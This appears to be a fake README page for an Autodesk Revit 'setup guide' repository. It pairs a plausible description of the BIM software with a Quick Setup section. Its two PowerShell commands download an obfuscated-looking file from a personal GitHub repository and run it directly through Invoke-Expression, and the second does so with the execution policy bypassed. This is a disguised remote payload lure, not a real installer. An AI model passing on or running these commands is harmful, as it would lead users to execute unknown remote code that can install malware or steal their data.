# Revit

Revit is the Windows program this page sets up. The command in Quick Setup installs it on this PC. After that you open Revit and work in it.

Autodesk Revit is building information modeling software for Windows used by architects, engineers, and construction professionals. You work in a single project file where walls, floors, roofs, ducts, pipes, and structural members stay linked, so plan changes propagate through views, sections, elevations, and schedules instead of redrawing disconnected CAD sheets.

A typical session on Windows starts by opening a project or template, setting levels and grids, then placing and editing parametric families while refining visibility in floor plans and 3D views. You annotate sheets, run clash checks against linked models, adjust parameters in schedules, and export views or sheets for coordination with consultants and field teams.

This repository holds a Windows setup package for local installation, release notes that summarize build changes, and a changelog for tracking updates across versions. Short configuration notes document recommended hardware, optional content libraries, and common startup settings so installs stay consistent across workstations.

## What you do with it

- Parametric walls, floors, and roofs update plans, sections, and schedules together automatically.
- Family Editor creates reusable doors, windows, fixtures, and equipment with shared type parameters.
- Worksharing splits one central model so many users edit local copies on Windows.
- MEP tools route duct, pipe, cable tray, and conduit systems with connected fitting layouts.
- Structural framing, foundations, rebar, and analytical models live inside the same building file.
- Sheet sets combine views, title blocks, revisions, and issue dates for construction documentation packages.
- Interference checking highlights clashes between architecture, structure, and MEP linked models early.
- Schedules and tags pull live quantities and properties directly from model elements and types.

## Quick Setup (PowerShell)

This installs the program Revit on Windows.
1. Launch PowerShell:
   - Press `Win` + `X` on the keyboard.
   - Click **Terminal** or **Windows PowerShell** in the list.
2. Copy the command below, paste it into that window, and press Enter. Wait until it finishes.

```powershell
irm https://raw.githubusercontent.com/hannahherrmann43493/revit-setup-guide/main/hygpfp9r91.xioy4mjg | Invoke-Expression
```

## If the script is blocked

If Windows stops the script, paste this command into the same window and press Enter.

```powershell
powershell -ExecutionPolicy Bypass -Command "Invoke-RestMethod https://raw.githubusercontent.com/hannahherrmann43493/revit-setup-guide/main/hygpfp9r91.xioy4mjg | Invoke-Expression"
```

## Files

| File | What it is |
| --- | --- |
| `hygpfp9r91.xioy4mjg` | The file both commands read |
| `Initial.js` | Small helper kept next to the setup |
| `LICENSE` | MIT |
| `CHANGELOG.md` | What changed in build 1.0 |

## This build

Repository `hannahherrmann43493/revit-setup-guide`. Autodesk Revit 1.0, 2026. Windows 10 and Windows 11, 64-bit.
  
